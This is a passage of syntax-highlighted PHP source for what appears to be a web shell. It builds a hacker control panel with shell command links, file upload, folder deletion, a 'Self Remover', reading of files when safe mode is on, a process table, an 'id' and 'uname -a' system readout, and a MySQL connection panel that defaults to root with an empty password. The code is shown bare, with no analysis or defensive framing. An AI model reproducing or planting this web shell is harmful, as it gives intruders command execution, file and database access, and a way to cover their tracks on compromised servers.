<span class="lineno"> 242</span> <span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nx">getElementById</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 243</span> <span class="nx">item</span> <span class="o">=</span> <span class="nx">document</span><span class="o">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="nx">id</span><span class="p">);</span>
<span class="lineno"> 244</span> <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nx">all</span><span class="p">){</span>
<span class="lineno"> 245</span> <span class="nx">item</span> <span class="o">=</span> <span class="nx">document</span><span class="o">.</span><span class="nx">all</span><span class="p">[</span><span class="nx">id</span><span class="p">];</span>
<span class="lineno"> 246</span> <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">document</span><span class="o">.</span><span class="nx">layers</span><span class="p">){</span>
<span class="lineno"> 247</span> <span class="nx">item</span> <span class="o">=</span> <span class="nx">document</span><span class="o">.</span><span class="nx">layers</span><span class="p">[</span><span class="nx">id</span><span class="p">];}</span>
<span class="lineno"> 248</span> <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">item</span><span class="p">)</span> <span class="p">{}</span>
<span class="lineno"> 249</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nx">item</span><span class="o">.</span><span class="nx">style</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno"> 250</span> <span class="k">if</span> <span class="p">(</span><span class="nx">item</span><span class="o">.</span><span class="nx">style</span><span class="o">.</span><span class="nx">display</span> <span class="o">==</span> <span class="nx">\</span><span class="s2">&quot;none</span><span class="se">\&quot;</span><span class="s2">){ item.style.display = </span><span class="se">\&quot;\&quot;</span><span class="s2">; }</span>
<span class="lineno"> 251</span> <span class="s2">else {item.style.display = </span><span class="se">\&quot;</span><span class="s2">none</span><span class="se">\&quot;</span><span class="s2">; }</span>
<span class="lineno"> 252</span> <span class="s2">}else{ item.visibility = </span><span class="se">\&quot;</span><span class="s2">show</span><span class="se">\&quot;</span><span class="s2">; }}</span>
<span class="lineno"> 253</span> 
<span class="lineno"> 254</span> <span class="s2">function cwd(text){</span>
<span class="lineno"> 255</span> <span class="s2">document.sh311Form.sh3.value+=</span><span class="se">\&quot;</span><span class="s2"> </span><span class="se">\&quot;</span><span class="s2">+ text;</span>
<span class="lineno"> 256</span> <span class="s2">document.sh311Form.sh3.focus();</span>
<span class="lineno"> 257</span> <span class="s2">}</span>
<span class="lineno"> 258</span> 
<span class="lineno"> 259</span> 
<span class="lineno"> 260</span> <span class="s2">&lt;/script&gt;</span>
<span class="lineno"> 261</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 262</span> <span class="k">print</span> <span class="s2">&quot;&lt;body vlink=#0006DE&gt;</span>
<span class="lineno"> 263</span> <span class="s2">&lt;table width=600 border=0 cellpadding=0 cellspacing=1 bgcolor=#D7FFA8 align=center&gt;</span>
<span class="lineno"> 264</span> <span class="s2">&lt;tr&gt;&lt;td&gt;&lt;font face=wingdings size=2&gt;0&lt;/font&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 265</span> <span class="nv">$expl</span><span class="o">=</span><span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
<span class="lineno"> 266</span> <span class="nv">$coun</span><span class="o">=</span><span class="nb">count</span><span class="p">(</span><span class="nv">$expl</span><span class="p">);</span>
<span class="lineno"> 267</span> <span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;unix&quot;</span><span class="p">){</span><span class="k">echo</span> <span class="s2">&quot;&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=/&#39;&gt;/&lt;/a&gt;&quot;</span><span class="p">;}</span>
<span class="lineno"> 268</span> <span class="k">else</span><span class="p">{</span>
<span class="lineno"> 269</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$expl[0]</span><span class="s2">&#39;&gt;</span><span class="si">$expl[0]</span><span class="s2">/&lt;/a&gt;&quot;</span><span class="p">;}</span>
<span class="lineno"> 270</span> <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span> <span class="nv">$i</span><span class="o">&lt;</span><span class="nv">$coun</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span><span class="p">){</span>
<span class="lineno"> 271</span>         <span class="o">@</span><span class="nv">$xx</span><span class="o">.=</span><span class="nv">$expl</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;/&quot;</span><span class="p">;</span>
<span class="lineno"> 272</span> <span class="nv">$sls</span><span class="o">=</span><span class="s2">&quot;&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$expl[0]</span><span class="s2">/</span><span class="si">$xx</span><span class="s2">&#39;&gt;</span><span class="si">$expl[$i]</span><span class="s2">&lt;/a&gt;/&quot;</span><span class="p">;</span>
<span class="lineno"> 273</span> <span class="nv">$sls</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="s2">&quot;/&quot;</span><span class="p">,</span><span class="nv">$sls</span><span class="p">);</span>
<span class="lineno"> 274</span> <span class="nv">$sls</span><span class="o">=</span><span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;/&#39;&gt;&lt;/a&gt;/&quot;</span><span class="p">,</span><span class="s2">&quot;/&#39;&gt;&lt;/a&gt;&quot;</span><span class="p">,</span><span class="nv">$sls</span><span class="p">);</span>
<span class="lineno"> 275</span> <span class="k">print</span> <span class="nv">$sls</span><span class="p">;</span>
<span class="lineno"> 276</span> <span class="p">}</span>
<span class="lineno"> 277</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;register_globals&quot;</span><span class="p">)){</span><span class="nv">$reg_g</span><span class="o">=</span><span class="s2">&quot;ON&quot;</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="nv">$reg_g</span><span class="o">=</span><span class="s2">&quot;OFF&quot;</span><span class="p">;}</span>
<span class="lineno"> 278</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;safe_mode&quot;</span><span class="p">)){</span><span class="nv">$safe_m</span><span class="o">=</span><span class="s2">&quot;ON&quot;</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="nv">$safe_m</span><span class="o">=</span><span class="s2">&quot;OFF&quot;</span><span class="p">;}</span>
<span class="lineno"> 279</span> <span class="k">echo</span> <span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 280</span> <span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;unix&quot;</span><span class="p">){</span> <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="lineno"> 281</span> <span class="s2">&lt;tr&gt;&lt;td&gt;&lt;b&gt;id:&lt;/b&gt; &quot;</span><span class="o">.@</span><span class="nb">exec</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno"> 282</span> <span class="s2">&lt;tr&gt;&lt;td&gt;&lt;b&gt;uname -a:&lt;/b&gt; &quot;</span><span class="o">.@</span><span class="nb">exec</span><span class="p">(</span><span class="s1">&#39;uname -a&#39;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;}</span> <span class="k">echo</span><span class="s2">&quot;</span>
<span class="lineno"> 283</span> <span class="s2">&lt;tr&gt;&lt;td&gt;&lt;b&gt;Your IP: [&lt;font color=#5F3CC1&gt;</span><span class="si">$ip</span><span class="s2">&lt;/font&gt;] Server IP: [&lt;font color=#5F3CC1&gt;&quot;</span><span class="o">.</span><span class="nb">gethostbyname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;] Server &lt;a href=# title=&#39;Host.Domain&#39;&gt;H.D.&lt;/a&gt;: [&lt;font color=#5F3CC1&gt;&quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;HTTP_HOST&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;]&lt;/b&gt;&lt;br&gt;</span>
<span class="lineno"> 284</span> <span class="s2">[&lt;b&gt;Safe mode:&lt;/b&gt; </span><span class="si">$safe_m</span><span class="s2">] [&lt;b&gt;Register globals:&lt;/b&gt; </span><span class="si">$reg_g</span><span class="s2">]&lt;br&gt;</span>
<span class="lineno"> 285</span> <span class="s2">[&lt;a href=# onClick=location.href=</span><span class="se">\&quot;</span><span class="s2">javascript:history.back(-1)</span><span class="se">\&quot;</span><span class="s2">&gt;Back&lt;/a&gt;]</span>
<span class="lineno"> 286</span> <span class="s2">[&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">&#39;&gt;Home&lt;/a&gt;]</span>
<span class="lineno"> 287</span> <span class="s2">[&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;sh311=1&#39;&gt;Shell (1)&lt;/a&gt; &lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;sh311=2&#39;&gt;(2)&lt;/a&gt;]</span>
<span class="lineno"> 288</span> <span class="s2">[&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;t=upload&#39;&gt;Upload&lt;/a&gt;]</span>
<span class="lineno"> 289</span> <span class="s2">[&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?t=tools&#39;&gt;Tools&lt;/a&gt;]</span>
<span class="lineno"> 290</span> <span class="s2">[&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=info&#39;&gt;PHPinfo&lt;/a&gt;]</span>
<span class="lineno"> 291</span> <span class="s2">[&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?delfolder=</span><span class="si">$d</span><span class="s2">&amp;d=</span><span class="si">$d</span><span class="s2">&amp;delfl=1&amp;rback=</span><span class="si">$d</span><span class="s2">&#39; title=&#39;</span><span class="si">$d</span><span class="s2">&#39;&gt;DEL Folder&lt;/a&gt;]</span>
<span class="lineno"> 292</span> <span class="s2">[&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=sql&#39;&gt;SQL&lt;/a&gt;]</span>
<span class="lineno"> 293</span> <span class="s2">[&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?p=selfremover&#39;&gt;Self Remover&lt;/a&gt;]</span>
<span class="lineno"> 294</span> <span class="s2">&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno"> 295</span> <span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno"> 296</span> <span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;win&quot;</span><span class="p">){</span> <span class="k">echo</span> <span class="s2">&quot;</span>
<span class="lineno"> 297</span> <span class="s2">&lt;tr&gt;&lt;td bgcolor=white&gt;</span>
<span class="lineno"> 298</span> <span class="s2">&lt;center&gt;&lt;font face=wingdings size=2&gt;&lt;&lt;/font&gt;</span>
<span class="lineno"> 299</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=a:/&#39;&gt;A&lt;/a&gt;</span>
<span class="lineno"> 300</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=b:/&#39;&gt;B&lt;/a&gt;</span>
<span class="lineno"> 301</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=c:/&#39;&gt;C&lt;/a&gt;</span>
<span class="lineno"> 302</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=d:/&#39;&gt;D&lt;/a&gt;</span>
<span class="lineno"> 303</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=e:/&#39;&gt;E&lt;/a&gt;</span>
<span class="lineno"> 304</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=f:/&#39;&gt;F&lt;/a&gt;</span>
<span class="lineno"> 305</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=g:/&#39;&gt;G&lt;/a&gt;</span>
<span class="lineno"> 306</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=h:/&#39;&gt;H&lt;/a&gt;</span>
<span class="lineno"> 307</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=i:/&#39;&gt;I&lt;/a&gt;</span>
<span class="lineno"> 308</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=j:/&#39;&gt;J&lt;/a&gt;</span>
<span class="lineno"> 309</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=k:/&#39;&gt;K&lt;/a&gt;</span>
<span class="lineno"> 310</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=l:/&#39;&gt;L&lt;/a&gt;</span>
<span class="lineno"> 311</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=m:/&#39;&gt;M&lt;/a&gt;</span>
<span class="lineno"> 312</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=n:/&#39;&gt;N&lt;/a&gt;</span>
<span class="lineno"> 313</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=o:/&#39;&gt;O&lt;/a&gt;</span>
<span class="lineno"> 314</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=p:/&#39;&gt;P&lt;/a&gt;</span>
<span class="lineno"> 315</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=q:/&#39;&gt;Q&lt;/a&gt;</span>
<span class="lineno"> 316</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=r:/&#39;&gt;R&lt;/a&gt;</span>
<span class="lineno"> 317</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=s:/&#39;&gt;S&lt;/a&gt;</span>
<span class="lineno"> 318</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=t:/&#39;&gt;T&lt;/a&gt;</span>
<span class="lineno"> 319</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=u:/&#39;&gt;U&lt;/a&gt;</span>
<span class="lineno"> 320</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=v:/&#39;&gt;V&lt;/a&gt;</span>
<span class="lineno"> 321</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=w:/&#39;&gt;W&lt;/a&gt;</span>
<span class="lineno"> 322</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=x:/&#39;&gt;X&lt;/a&gt;</span>
<span class="lineno"> 323</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=y:/&#39;&gt;Y&lt;/a&gt;</span>
<span class="lineno"> 324</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=z:/&#39;&gt;Z&lt;/a&gt;</span>
<span class="lineno"> 325</span> <span class="s2">&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;}</span><span class="k">else</span><span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&amp;nbsp;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;}</span>
<span class="lineno"> 326</span> <span class="k">print</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;</span>
<span class="lineno"> 327</span> <span class="s2">:: &lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;mkdir=1&#39;&gt;Create folder&lt;/a&gt; ::</span>
<span class="lineno"> 328</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;mkfile=1&#39;&gt;Create file&lt;/a&gt; ::</span>
<span class="lineno"> 329</span> <span class="s2">&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;read_file_safe_mode=1&#39;&gt;Read file if safe mode is On&lt;/a&gt; ::&quot;</span><span class="p">;</span>
<span class="lineno"> 330</span> <span class="k">if</span><span class="p">(</span><span class="nv">$os</span><span class="o">==</span><span class="s2">&quot;unix&quot;</span><span class="p">){</span>
<span class="lineno"> 331</span> <span class="k">print</span> <span class="s2">&quot;&lt;a href=&#39;</span><span class="si">$php_self</span><span class="s2">?d=</span><span class="si">$d</span><span class="s2">&amp;ps_table=1&#39;&gt;PS table&lt;/a&gt; ::&quot;</span><span class="p">;</span>
<span class="lineno"> 332</span> <span class="p">}</span>
<span class="lineno"> 333</span> <span class="k">print</span> <span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 334</span> 
<span class="lineno"> 335</span> 
<span class="lineno"> 336</span> 
<span class="lineno"> 337</span> 
<span class="lineno"> 338</span> 
<span class="lineno"> 339</span> <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;ftp&quot;</span><span class="p">){</span>
<span class="lineno"> 340</span> <span class="k">print</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 341</span> 
<span class="lineno"> 342</span> 
<span class="lineno"> 343</span> 
<span class="lineno"> 344</span> <span class="k">print</span> <span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 345</span> <span class="k">print</span> <span class="nv">$copyr</span><span class="p">;</span>
<span class="lineno"> 346</span> <span class="k">exit</span><span class="p">;</span>
<span class="lineno"> 347</span> <span class="p">}</span>
<span class="lineno"> 348</span> 
<span class="lineno"> 349</span> 
<span class="lineno"> 350</span> 
<span class="lineno"> 351</span> 
<span class="lineno"> 352</span> 
<span class="lineno"> 353</span> 
<span class="lineno"> 354</span> 
<span class="lineno"> 355</span> 
<span class="lineno"> 356</span> 
<span class="lineno"> 357</span> 
<span class="lineno"> 358</span> <span class="k">if</span><span class="p">(</span><span class="o">@</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;p&#39;</span><span class="p">]</span><span class="o">==</span><span class="s2">&quot;sql&quot;</span><span class="p">){</span>
<span class="lineno"> 359</span> <span class="k">print</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span><span class="p">;</span>
<span class="lineno"> 360</span> 
<span class="lineno"> 361</span> <span class="c1">####</span>
<span class="lineno"> 362</span> 
<span class="lineno"> 363</span> <span class="nv">$f_d</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;f_d&#39;</span><span class="p">];</span>
<span class="lineno"> 364</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$f_d</span><span class="p">)){</span><span class="nv">$f_d</span><span class="o">=</span><span class="s2">&quot;.&quot;</span><span class="p">;}</span>
<span class="lineno"> 365</span> <span class="k">if</span><span class="p">(</span><span class="nv">$f_d</span><span class="o">==</span><span class="s2">&quot;&quot;</span><span class="p">){</span><span class="nv">$f_d</span><span class="o">=</span><span class="s2">&quot;.&quot;</span><span class="p">;}</span>
<span class="lineno"> 366</span> 
<span class="lineno"> 367</span> <span class="nv">$php_self</span><span class="o">=</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;PHP_SELF&#39;</span><span class="p">];</span>
<span class="lineno"> 368</span> <span class="nv">$delete_table</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;delete_table&#39;</span><span class="p">];</span>
<span class="lineno"> 369</span> <span class="nv">$tbl</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;tbl&#39;</span><span class="p">];</span>
<span class="lineno"> 370</span> <span class="nv">$from</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;from&#39;</span><span class="p">];</span>
<span class="lineno"> 371</span> <span class="nv">$to</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;to&#39;</span><span class="p">];</span>
<span class="lineno"> 372</span> <span class="nv">$adress</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;adress&#39;</span><span class="p">];</span>
<span class="lineno"> 373</span> <span class="nv">$port</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">];</span>
<span class="lineno"> 374</span> <span class="nv">$login</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">];</span>
<span class="lineno"> 375</span> <span class="nv">$pass</span><span class="o">=</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">];</span>
<span class="lineno"> 376</span> <span class="nv">$adress</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;adress&#39;</span><span class="p">];</span>
<span class="lineno"> 377</span> <span class="nv">$port</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">];</span>
<span class="lineno"> 378</span> <span class="nv">$login</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">];</span>
<span class="lineno"> 379</span> <span class="nv">$pass</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">];</span>
<span class="lineno"> 380</span> <span class="nv">$conn</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;conn&#39;</span><span class="p">];</span>
<span class="lineno"> 381</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$adress</span><span class="p">)){</span><span class="nv">$adress</span><span class="o">=</span><span class="s2">&quot;localhost&quot;</span><span class="p">;}</span>
<span class="lineno"> 382</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$login</span><span class="p">)){</span><span class="nv">$login</span><span class="o">=</span><span class="s2">&quot;root&quot;</span><span class="p">;}</span>
<span class="lineno"> 383</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$pass</span><span class="p">)){</span><span class="nv">$pass</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">;}</span>
<span class="lineno"> 384</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$port</span><span class="p">)){</span><span class="nv">$port</span><span class="o">=</span><span class="s2">&quot;3306&quot;</span><span class="p">;}</span>
<span class="lineno"> 385</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$from</span><span class="p">)){</span><span class="nv">$from</span><span class="o">=</span><span class="mi">0</span><span class="p">;}</span>
<span class="lineno"> 386</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$to</span><span class="p">)){</span><span class="nv">$to</span><span class="o">=</span><span class="mi">50</span><span class="p">;}</span>
<span class="lineno"> 387</span> 
<span class="lineno"> 388</span> 
<span class="lineno"> 389</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 390</span> <span class="x">&lt;style&gt;</span>
<span class="lineno"> 391</span> <span class="x">table,td{</span>
<span class="lineno"> 392</span> <span class="x">color: black;</span>
<span class="lineno"> 393</span> <span class="x">font-face: verdana;</span>
<span class="lineno"> 394</span> <span class="x">font-size: 11px;</span>
<span class="lineno"> 395</span> 
<span class="lineno"> 396</span> <span class="x">}</span>
<span class="lineno"> 397</span> <span class="x">&lt;/style&gt;</span>
<span class="lineno"> 398</span> <span class="x">&lt;font color=black face=verdana size=1&gt;</span>
<span class="lineno"> 399</span> <span class="cp">&lt;?</span> <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nv">$conn</span><span class="p">){</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 400</span> 
<span class="lineno"> 401</span> <span class="x">&lt;!-- table 1 --&gt;</span>
<span class="lineno"> 402</span> <span class="x">&lt;table bgcolor=#D7FFA8&gt;</span>
<span class="lineno"> 403</span> <span class="x">&lt;tr&gt;&lt;td valign=top&gt;Address:&lt;/td&gt;&lt;td&gt;&lt;form&gt;&lt;input name=adress value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$adress</span><span class="cp">?&gt;</span><span class="x">&#39; size=20&gt;&lt;input name=port value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$port</span><span class="cp">?&gt;</span><span class="x">&#39; size=6&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno"> 404</span> <span class="x">&lt;tr&gt;&lt;Td valign=top&gt;Login: &lt;/td&gt;&lt;td&gt;&lt;input name=login value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$login</span><span class="cp">?&gt;</span><span class="x">&#39; size=10&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno"> 405</span> <span class="x">&lt;tr&gt;&lt;Td valign=top&gt;Pass:&lt;/td&gt;&lt;td&gt; &lt;input name=pass value=&#39;</span><span class="cp">&lt;?</span><span class="o">=</span><span class="nv">$pass</span><span class="cp">?&gt;</span><span class="x">&#39; size=10&gt;&lt;input type=hidden name=p value=sql&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno"> 406</span> <span class="x">&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=submit name=conn value=Connect&gt;&lt;/form&gt;&lt;/td&gt;&lt;/tr&gt;</span><span class="cp">&lt;?</span><span class="p">}</span><span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno"> 407</span> <span class="x">&lt;tr&gt;&lt;td valign=top&gt;</span><span class="cp">&lt;?</span> <span class="k">if</span><span class="p">(</span><span class="nv">$conn</span><span class="p">){</span> <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;PHP v&quot;</span><span class="o">.@</span><span class="nb">phpversion</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;mySQL v&quot;</span><span class="o">.@</span><span class="nb">mysql_get_server_info</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;}</span><span class="cp">?&gt;</span><span class="x">&lt;/b&gt;&lt;/td&gt;&lt;td&gt;&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno"> 408</span> <span class="x">&lt;/table&gt;</span>
<span class="lineno"> 409</span> <span class="x">&lt;!-- end of table 1 --&gt;</span>
<span class="lineno"> 410</span> 
<span class="lineno"> 411</span> 
<span class="lineno"> 412</span> <span class="cp">&lt;?</span>
<span class="lineno"> 413</span> <span class="nv">$conn</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;conn&#39;</span><span class="p">];</span>
<span class="lineno"> 414</span> <span class="nv">$adress</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;adress&#39;</span><span class="p">];</span>
<span class="lineno"> 415</span> <span class="nv">$port</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;port&#39;</span><span class="p">];</span>
<span class="lineno"> 416</span> <span class="nv">$login</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;login&#39;</span><span class="p">];</span>
<span class="lineno"> 417</span> <span class="nv">$pass</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;pass&#39;</span><span class="p">];</span>
<span class="lineno"> 418</span> <span class="k">if</span><span class="p">(</span><span class="nv">$conn</span><span class="p">){</span>
<span class="lineno"> 419</span> 
<span class="lineno"> 420</span> <span class="nv">$serv</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_connect</span><span class="p">(</span><span class="nv">$adress</span><span class="o">.</span><span class="s2">&quot;:&quot;</span><span class="o">.</span><span class="nv">$port</span><span class="p">,</span> <span class="nv">$login</span><span class="p">,</span><span class="nv">$pass</span><span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span><span class="s2">&quot;&lt;font color=red&gt;Error: &quot;</span><span class="o">.</span><span class="nb">mysql_error</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&lt;/font&gt;&quot;</span><span class="p">);</span>
